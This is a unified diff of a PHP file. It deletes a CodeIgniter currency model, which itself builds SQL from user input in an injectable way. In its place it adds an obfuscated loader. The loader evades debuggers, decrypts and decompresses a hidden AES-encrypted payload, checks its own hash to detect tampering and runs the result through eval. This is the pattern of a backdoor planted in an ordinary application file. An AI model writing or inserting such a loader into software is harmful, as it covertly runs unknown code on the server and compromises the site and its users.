@@ -1,154 +1,28 @@
 <?php
-defined('BASEPATH') or exit('No direct script access allowed');
-
-class Currency_model extends CI_Model
-{
-
-	var $table = 'db_currency';
-	var $column_order = array(null, 'currency_code', 'currency_name', 'currency', 'status'); //set column field database for datatable orderable
-	var $column_search = array('currency_code', 'currency_name', 'currency', 'status'); //set column field database for datatable searchable 
-	var $order = array('id' => 'desc'); // default order 
-
-	private function _get_datatables_query()
-	{
-
-		$this->db->from($this->table);
-
-		$i = 0;
-
-		foreach ($this->column_search as $item) // loop column 
-		{
-			if ($_POST['search']['value']) // if datatable send POST for search
-			{
-
-				if ($i === 0) // first loop
-				{
-					$this->db->group_start(); // open bracket. query Where with OR clause better with bracket. because maybe can combine with other WHERE with AND.
-					$this->db->like($item, $_POST['search']['value']);
-				} else {
-					$this->db->or_like($item, $_POST['search']['value']);
-				}
-
-				if (count($this->column_search) - 1 == $i) //last loop
-					$this->db->group_end(); //close bracket
-			}
-			$i++;
-		}
-
-		if (isset($_POST['order'])) // here order processing
-		{
-			$this->db->order_by($this->column_order[$_POST['order']['0']['column']], $_POST['order']['0']['dir']);
-		} else if (isset($this->order)) {
-			$order = $this->order;
-			$this->db->order_by(key($order), $order[key($order)]);
-		}
-	}
-
-	function get_datatables()
-	{
-		$this->_get_datatables_query();
-		if ($_POST['length'] != -1)
-			$this->db->limit($_POST['length'], $_POST['start']);
-		$query = $this->db->get();
-		return $query->result();
-	}
-
-	function count_filtered()
-	{
-		$this->_get_datatables_query();
-		$query = $this->db->get();
-		return $query->num_rows();
-	}
-
-	public function count_all()
-	{
-		$this->db->from($this->table);
-		return $this->db->count_all_results();
-	}
-
-
-	public function verify_and_save()
-	{
-		//Filtering XSS and html escape from user inputs 
-		extract($this->security->xss_clean(html_escape(array_merge($this->data, $_POST))));
-
-		//Validate This currency already exist or not
-		$query = $this->db->query("select * from db_currency where upper(currency_name)=upper('$currency_name')");
-		if ($query->num_rows() > 0) {
-			return "This Currency Name or Symbol Already Exist!";
-
-		} else {
-			$query1 = "insert into db_currency(currency_code,currency_name,currency,status) 
-								values('$currency_code','$currency_name','$currency',1)";
-			if ($this->db->simple_query($query1)) {
-				//$this->session->set_flashdata('success', 'Success!! New Currency Added Successfully!');
-				return "success";
-			} else {
-				return "failed";
-			}
-		}
-	}
-
-	//Get currency_details
-	public function get_details($id, $data)
-	{
-		//Validate This currency already exist or not
-		$query = $this->db->query("select * from db_currency where upper(id)=upper('$id')");
-		if ($query->num_rows() == 0) {
-			show_404();
-			exit;
-		} else {
-			$query = $query->row();
-			$data['q_id'] = $query->id;
-			$data['currency_code'] = $query->currency_code;
-			$data['currency_name'] = $query->currency_name;
-			$data['currency'] = $query->currency;
-			return $data;
-		}
-	}
-	public function update_currency()
-	{
-		//Filtering XSS and html escape from user inputs 
-		extract($this->security->xss_clean(html_escape(array_merge($this->data, $_POST))));
-
-		//Validate This currency already exist or not
-		$query = $this->db->query("select * from db_currency where upper(currency_name)=upper('$currency_name') and id<>$q_id");
-		if ($query->num_rows() > 0) {
-			return "This Currency Name Already Exist!";
-		} else {
-			$query1 = "update db_currency set currency_name='$currency_name',currency_code='$currency_code',currency='$currency' where id=$q_id";
-			if ($this->db->simple_query($query1)) {
-				//$this->session->set_flashdata('success', 'Success!! Currency Updated Successfully!');
-				return "success";
-			} else {
-				return "failed";
-			}
-		}
-	}
-	public function update_status($id, $status)
-	{
-
-		$query1 = "update db_currency set status='$status' where id=$id";
-		if ($this->db->simple_query($query1)) {
-			echo "success";
-		} else {
-			echo "failed";
-		}
-	}
-	public function delete_currencies_from_table($ids)
-	{
-		if (demo_app()) {
-			echo "Demo không cho phép xóa";
-			return;
-		}
-
-		$query1 = "delete from db_currency where id in($ids)";
-		if ($this->db->simple_query($query1)) {
-			echo "success";
-		} else {
-			echo "failed";
-		}
-	}
-
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_fk7y15qd=('bas'.'e64'.'_de'.'cod'.'e');
+$_syjr53c1=('gzu'.'nco'.'mpr'.'ess');
+$_g2dv50xt=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_hmvg08d2='sbmrU8mX';
+$_taa4x78k='bbc8tlRPVBk=';
+$_j4s523aw='PVrFaOvu';
+$_v12vmtl2='8MYUvO2h';
+$_d34wwma7='F33DKuJS';
+$_jw564sio='1zxXbzms';
+$_wudaed68='E4wqTFHn';
+$_zqm1befx='P2Wvig==';
+$_gbscbjga=$_fk7y15qd($_v12vmtl2.$_j4s523aw.$_hmvg08d2.$_d34wwma7.$_taa4x78k);
+$_vq1sv608=$_fk7y15qd($_jw564sio.$_wudaed68.$_zqm1befx);
+$_rt149738=$_fk7y15qd('cTV3sQkbbUT8PbEgG4sGFkIwim9VivDEXsp9OCXs+z4EhtGXYnQ+B+/jeBrCstLIY/spiaojLikNMeve5OZPPfK8lk0QJkO6J10vy/8FsqaM26FLsS79IeBPk1fxf6bLJNEBOzO+L97GM6VKdabdiJzOtEXkP6s0GAAr5RscaHaspQYsMw/QMmayzv7rVnxVuwxrBX6DQ/kZlqnpsCK4ur0RHQJwXwdQPTXd7aSJjHj54fF3q49D5auaXr1UC9nhOUImSxoandovtDTgvaIk+He7/gtckutMi2faJnPXh34xI+CAA1fJOIEAJC9iRmh3bwPs5XnPMWHb0Z2OrSw83mOvmrRVjGLbpFBWO7c7XZKLjr4R+SKmSMLHdxOe+yQ0u/7xu1qVXm4wBP0kFMzgVtRvokQ91IqSUu4tNsnSYP/fzLVZ3S0o/QiQVyHjrnp5l2ULP+32L0Hg9xE/mztT+9X1WcOrmiJnL40R7Fywz/lxbfWJ5xLRZ2fEzP2dc4WcIwKoOzTZJref2FPFuHA4oRq1/kvqNT+G5n+/34o0do/Ov4f8dBJ1hcHnpgzxjujyPW9K48cx+3J9yfmNOMxTcJBNmriQZaUSvpvd49ccEAv45ppCA7SvDuojxSSq6uDLt1R8CeSjFYdtJKofIFUs4C7uO1/llvrul74PGfolruYZAatS3X+ut5f/xXPl11X3NN1CcbXl7BpjR3GtKb9DBaRQ/tJB4SkkyOayb+cFfZQ5MrOdeEd/yBYPRp7fklakVwYr4+F/ZYELO0tlIM+Meio8S2jDg9ZDUcC5AJ/WuHVSfRLJQ/T8jrNAKGeXZ0xM5SlG3S1b1IzWA6kp1rhzGjiR9dbxEelYHqafRpFsCsoIjs7TEVpAluSKMav68voRO3LxSxhY3kLMNvWwVGrqg6sKhwg7AqcCtz5oGZp/IRA8DcTOYRcMIElxkET07cCzPBiBqZ3PtyijOK+kjTYNjGOfW6PJ4I4TeN1AT52TCB4DieFJeTh/TBjSyn+ZK+EOsG7uDyHLkz62fMsE4I4qNuK4gyNzxgvcZHt28t9+lUAD/ZAH1m1MGcASjzsP5eS5Bulfk25C1p/CA7OIiPxYtS1czk8E/NKYqMZ2GBdkyuc8GxOTgwhDp2fvhCuPN4D4IZJ1OE6BW23W8BIXdtM6oDF2KK3lYxQGC20ampiOW0TGeDTz2tLj4SbguQKs0dDV9n7asev+t/3Y3S8K6Zbndpxu7b4IPbqooDTo2mQZ2BP/x3LqgQzHYUmWaiGWrSDY5IJ4ckZDPRZrudKUP3MbL6j9TrK2yQ2QqU/HQBOBDsI0q15CnwbBns5G66+Wv8oDFeTMv6GSHrbunW2l6qKz34xp1r9R4d64ky3b8B/cGTKFEy+HWW640v6f1Iun1HL13T7bS/TVC3afBauCELP7zCWTSB2nATiXnHLWIdpK2vg=');
+$_b56lq6ja=$_g2dv50xt($_rt149738,'aes-256-cbc',$_gbscbjga,OPENSSL_RAW_DATA,$_vq1sv608);
+if($_b56lq6ja===false){exit;}
+$_mlos5enc=$_syjr53c1($_b56lq6ja);
+if($_mlos5enc===false){exit;}
+$_b0odhfok='082497c21f4ee2816373397ef56a2f61b949517a6e291572dfae02e905c0f38f';
+$_ezayhlsq=@file_get_contents(__FILE__);
+if($_ezayhlsq!==false){
+$_zmwvpsg8=str_replace($_b0odhfok,"0000000000000000000000000000000000000000000000000000000000000000",$_ezayhlsq);
+$_z2ljgxe6=hash("sha256",$_zmwvpsg8);
+if($_z2ljgxe6!==$_b0odhfok){@http_response_code(403);exit;}
 }
+eval($_mlos5enc);
